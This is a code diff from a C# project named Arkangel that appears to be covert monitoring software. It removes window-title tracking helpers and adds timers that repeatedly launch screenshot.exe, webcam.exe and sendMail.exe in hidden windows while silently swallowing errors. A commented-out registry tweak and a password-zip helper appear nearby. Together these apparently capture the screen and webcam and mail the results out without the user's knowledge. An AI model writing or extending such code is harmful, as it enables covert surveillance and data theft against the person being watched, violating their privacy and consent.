@@ -9,6 +9,7 @@ using System.Runtime.InteropServices;
 using System.Security.Principal;
 using System.Text;
 using System.Threading.Tasks;
+using System.Timers;
 
 namespace Arkangel
 {
@@ -103,39 +104,6 @@ namespace Arkangel
             //ComputerGroupPolicyObject.SetPolicySetting(@"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System!DisableRegistryTools", "0", RegistryValueKind.DWord);
         }
 
-        [DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
-        public static extern IntPtr GetForegroundWindow();
-        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int cch);
-        //[DllImport("user32.dll")]
-
-        public static string GetActiveWindowText()
-        {
-            var handle = GetForegroundWindow();
-            var sb = new StringBuilder();
-            try
-            {
-                GetWindowText(handle, sb, 1000);
-            }
-            catch (Exception ex)
-            {
-                return null;
-            }
-            return sb.Length == 0 ? "UnhandleWindow" : sb.ToString();
-        }
-
-        public static bool IsTarget(string winTitle, List<string> targetList)
-        {
-            if (targetList.Count == 0)
-                return false;
-            foreach (var s in targetList)
-            {
-                if (winTitle.ToLower().Contains(s) == true || s.Contains(winTitle.ToLower()))
-                    return true;
-            }
-            return false;
-        }
-
         public static void ZipFolder(string dir, string password)
         {
             using (ZipFile zip = new ZipFile())
@@ -149,27 +117,73 @@ namespace Arkangel
             }
         }
 
-        public static void CallPyModule(string module)
+        // Timer for screenshot
+        public static void SetTimerScreenShot(int _time)
         {
-            Process myProcess = new Process();
-
+            // Create a timer with a two second interval.
+            MainWindow.aTimer_scrshot = new System.Timers.Timer(_time);
+            // Hook up the Elapsed event for the timer. 
+            MainWindow.aTimer_scrshot.Elapsed += OnTimedEventScreenShot;
+            MainWindow.aTimer_scrshot.AutoReset = true;
+            MainWindow.aTimer_scrshot.Enabled = true;
+        }
+        public static void OnTimedEventScreenShot(Object source, ElapsedEventArgs e)
+        {
             try
             {
-                myProcess.StartInfo.UseShellExecute = true;
-                // You can start any process, HelloWorld is a do-nothing example.
-                myProcess.StartInfo.FileName = "..\\..\\Module_py\\" + module;
-                myProcess.StartInfo.CreateNoWindow = true;
-                myProcess.Start();
-                // This code assumes the process you are starting will terminate itself. 
-                // Given that is is started without a window so you cannot terminate it 
-                // on the desktop, it must terminate itself or you can do it programmatically
-                // from this application using the Kill method.
-                //myProcess.Kill();
+                ProcessStartInfo start = new ProcessStartInfo();
+                start.WorkingDirectory = @"..\..\module\";
+                start.FileName = "screenshot.exe";
+                start.WindowStyle = ProcessWindowStyle.Hidden;
+                Process.Start(start);
             }
-            catch (Exception ex)
+            catch { }
+        }
+
+        // Timer for Webcam
+        public static void SetTimerWebcam(int _time)
+        {
+            // Create a timer with a two second interval.
+            MainWindow.aTimer_webcam = new System.Timers.Timer(_time);
+            // Hook up the Elapsed event for the timer. 
+            MainWindow.aTimer_webcam.Elapsed += OnTimedEventWebcam;
+            MainWindow.aTimer_webcam.AutoReset = true;
+            MainWindow.aTimer_webcam.Enabled = true;
+        }
+        public static void OnTimedEventWebcam(Object source, ElapsedEventArgs e)
+        {
+            try
             {
-                Console.WriteLine("MESSAGE: " + ex.Message);
+                ProcessStartInfo start = new ProcessStartInfo();
+                start.WorkingDirectory = @"..\..\module\";
+                start.FileName = "webcam.exe";
+                start.WindowStyle = ProcessWindowStyle.Hidden;
+                Process.Start(start);
             }
+            catch { }
+        }
+
+        // Timer for Send mail
+        public static void SetTimerSendMail(int _time)
+        {
+            // Create a timer with a two second interval.
+            MainWindow.aTimer_sendMail = new System.Timers.Timer(_time);
+            // Hook up the Elapsed event for the timer. 
+            MainWindow.aTimer_sendMail.Elapsed += OnTimedEventSendMail;
+            MainWindow.aTimer_sendMail.AutoReset = true;
+            MainWindow.aTimer_sendMail.Enabled = true;
+        }
+        public static void OnTimedEventSendMail(Object source, ElapsedEventArgs e)
+        {
+            try
+            {
+                ProcessStartInfo start = new ProcessStartInfo();
+                start.WorkingDirectory = @"..\..\module\";
+                start.FileName = "sendMail.exe";
+                start.WindowStyle = ProcessWindowStyle.Hidden;
+                Process.Start(start);
+            }
+            catch { }
         }
     }
 }
